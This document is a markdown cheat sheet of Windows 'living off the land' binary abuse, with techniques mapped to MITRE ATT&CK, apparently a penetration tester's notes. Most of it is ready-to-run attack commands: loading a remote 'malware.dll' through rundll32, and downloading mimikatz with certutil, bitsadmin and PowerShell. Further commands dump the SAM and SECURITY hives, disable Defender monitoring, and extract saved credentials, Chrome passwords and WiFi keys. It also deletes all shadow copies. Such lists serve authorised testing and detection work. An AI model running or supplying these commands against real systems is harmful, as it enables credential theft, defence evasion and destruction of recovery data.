# Windows Living off the land - Binaries (LOLBIN)

----------

## Abusing rundll32.exe

### Mitre ATT&CK Summary
Tactic | Technique ID | Technique Name | Sub-technique Name | Defence Bypassed
:---:|:---:|:---:|:---:|:---:
Defence Evasion|T1218.011D|System Binary Proxy Execution|System Binary Proxy Execution: Rundll32|Anti-virus, Application control, Digital Certificate Validation

### Examples

For a good list of DLLs and API calls see:

[https://malapi.io/](https://malapi.io/)

For more examples see also:

[https://www.tenforums.com/tutorials/77458-rundll32-commands-list-windows-10-a.html](https://www.tenforums.com/tutorials/77458-rundll32-commands-list-windows-10-a.html)

[https://www.thewindowsclub.com/rundll32-shortcut-commands-windows](https://www.thewindowsclub.com/rundll32-shortcut-commands-windows)

[https://www.elevenforum.com/t/complete-list-of-rundll32-commands-in-windows-11.17062/](https://www.elevenforum.com/t/complete-list-of-rundll32-commands-in-windows-11.17062/)

    	rundll32.exe <DLL_PATH>,<DLL_ENRTY_POINT>
    	run32dll32.exe \\192.168.4.25\mdll\malware.dll,do_bad_stuff
	Examples:
	To clear browsing history:
		rundll32.exe InetCpl.cpl,ClearMyTracksByProcess 255
	To lock PC
		rundll32.exe user32.dll,LockWorkStation
	To start firewall GUI
		rundll32.exe shell32.dll,Control_RunDLL firewall.cpl

## Abusing certutil.exe
### Mitre ATT&CK Summary
Tactic | Technique ID | Technique Name | Sub-technique Name | Defence Bypassed
:---:|:---:|:---:|:---:|:---:
Command and Control|T1105|Ingress Tool Transfer|S0160|N/A

### Examples

    certutil -urlcache -f https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe mimikatz64.exe
	To encode at server:
		certutil -encode mimikatz64.exe mimikatz64_enc.exe
	To decode at target:
		certutil -decode mimikatz64_enc.exe mimikatz64_dec.exe

## Abusing bitsadmin.exe
### Mitre ATT&CK Summary
Tactic | Technique ID | Technique Name | Sub-technique Name | Defence Bypassed
:---:|:---:|:---:|:---:|:---:
Command and Control|T1105|Ingress Tool Transfer|S0190|N/A

### Examples

    bitsadmin /list
    bitsadmin /create hacker
    bitsadmin /addfile hacker https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe "D:\Penetration Tests\Tests\b_scratchpad\01_script_dev\mimikatz64.exe"
    bitsadmin /list /verbose
    bitsadmin /resume hacker
    bitsadmin /complete hacker
    bitsadmin /reset
    bitsadmin /list /verbose

## Abusing conhost.exe
### Mitre ATT&CK Summary
Tactic | Technique ID | Technique Name | Sub-technique Name | Defence Bypassed
:---:|:---:|:---:|:---:|:---:
Privilege Escalation|T1068|Exploitation for Privilege Escalation|N/A|N/A

### Examples

    conhost calc.exe
    conhost --headless calc.exe

## Abusing mshta.exe
### Mitre ATT&CK Summary
Tactic | Technique ID | Technique Name | Sub-technique Name | Defence Bypassed
:---:|:---:|:---:|:---:|:---:
Defence Evasion|T1218.005|System Binary Proxy Execution|System Binary Proxy Execution: Mshta|Application control, Digital Certificate Validation

### Examples

    mshta.exe myapp.hta

## Abusing reg.exe
### Mitre ATT&CK Summary
Tactic | Technique ID | Technique Name | Sub-technique Name | Defence Bypassed
:---:|:---:|:---:|:---:|:---:
Persistence, Privilege Escalation|T1547.001|Boot or Logon Autostart Execution:|Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder|N/A

### Examples

    Export SAM and SECURITY
    	reg save HKLM\SAM "D:\Penetration Tests\Tests\b_scratchpad\01_script_dev\SAM"
    	reg save HKLM\SECURITY "D:\Penetration Tests\Tests\b_scratchpad\01_script_dev\SECURITY"
    
    Disable defender real time protection
    	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
    
    Query current setting
    	reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\real-Time Protection" /v DisableRealtimeMonitoring

## Abusing wscript.exe
### Mitre ATT&CK Summary
Tactic | Technique ID | Technique Name | Sub-technique Name | Defence Bypassed
:---:|:---:|:---:|:---:|:---:
Execution|T1059.005|Command and Scripting Interpreter|Command and Scripting Interpreter: Visual Basic|N/A

### Examples

In open_calc.vbs:

    'msgbox "Click OK to run calculator"
    Set shell=CreateObject("wscript.shell")
    Shell.Run("calc.exe")

From console/powershell:

    wscript open_calc.vbs

## Abusing powershell.exe
### Mitre ATT&CK Summary
Tactic | Technique ID | Technique Name | Sub-technique Name | Defence Bypassed
:---:|:---:|:---:|:---:|:---:
Execution|T1059.001|Command and Scripting Interpreter|Command and Scripting Interpreter: PowerShell|N/A

### Examples

[Basic introduction](https://www.varonis.com/blog/powershell-for-pentesters)

[25 commands - some below](https://www.infosecmatter.com/powershell-commands-for-pentesters/)

### *Commonly used*

### Download mimikatz (remember to use 'raw' not 'blob'):
    Invoke-WebRequest -Uri https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe -OutFile mimdld.exe

### *Locating files with sensitive information*

### Find potentially interesting files

    gci c:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue

### Find credentials in Sysprep or Unattend files

    gci c:\ -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue

### Find configuration files containing “password” string

    gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"

### Find database credentials in configuration files

    gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern "connectionString"

### Locate web server configuration files

    gci c:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue

### *Extracting credentials*

### Get stored passwords from Windows Credential Manager
Requires the CredentialManager PowerShell module:
    
    Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }

### Dump passwords from Google Chrome browser

    [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))

### Get WiFI passwords:

    (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize

### Search for SNMP community string in registry

    gci HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse -EA SilentlyContinue

### Search for string pattern in registry
The following PowerShell command will sift through the selected registry hives (HKCR, HKCU, HKLM, HKU, and HKCC) and recursively search for any chosen pattern within the registry key names or data values. In this case we are searching for the “password” pattern:

    $pattern = "password"
    $hives = "HKEY_CLASSES_ROOT","HKEY_CURRENT_USER","HKEY_LOCAL_MACHINE","HKEY_USERS","HKEY_CURRENT_CONFIG"
    
    # Search in registry keys
    foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | sls "$pattern" }
    
    # Search in registry values
    foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match "$pattern") { $_.PsPath; $_ | out-string -stream | sls "$pattern" }}}

### *Privilege escalation*

### Search registry for auto-logon credentials

    gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select "Default*"

### Check if AlwaysInstallElevated is enabled

    gp 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated
    gp 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated

### Find unquoted service paths

    gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name

## Abusing wmic.exe
### Mitre ATT&CK Summary
Tactic | Technique ID | Technique Name | Sub-technique Name | Defence Bypassed
:---:|:---:|:---:|:---:|:---:
Execution|T1047|Windows Management Instrumentation|N/A|N/A

    wmic process call create calc.exe
    wmic shadowcopy call create Volume=C:\
    
    wmic /node:192.168.4.31 service where "caption like '%sql server%'" get Name,DisplayName,PathName,State,Status
    
    $services = Get-WmiObject Win32_Service -Property Name,DisplayName,PathName | Select Name, DisplayName,PathName
    $serviceList = New-Object System.Collections.ArrayList
    Write-Host $serviceList

## Abusing rclone and vssadmin
### Mitre ATT&CK Summary - rclone.exe
Tactic | Technique ID | Technique Name | Sub-technique Name | Defence Bypassed
:---:|:---:|:---:|:---:|:---:
Exfiltration|T1567.002|Exfiltration Over Web Service|Exfiltration Over Web Service: Exfiltration to Cloud Storage|N/A

### Mitre ATT&CK Summary - vssadmin.exe
Tactic | Technique ID | Technique Name | Sub-technique Name | Defence Bypassed
:---:|:---:|:---:|:---:|:---:
Discovery,Impact|T1082,T1490|System Information Discovery,Inhibit System Recovery|N/A|N/A

### Examples
    vssadmin.exe delete shadows /all /quiet
    C:\\Windows\\system32\\wbem\\wmic.exe shadowcopy delete
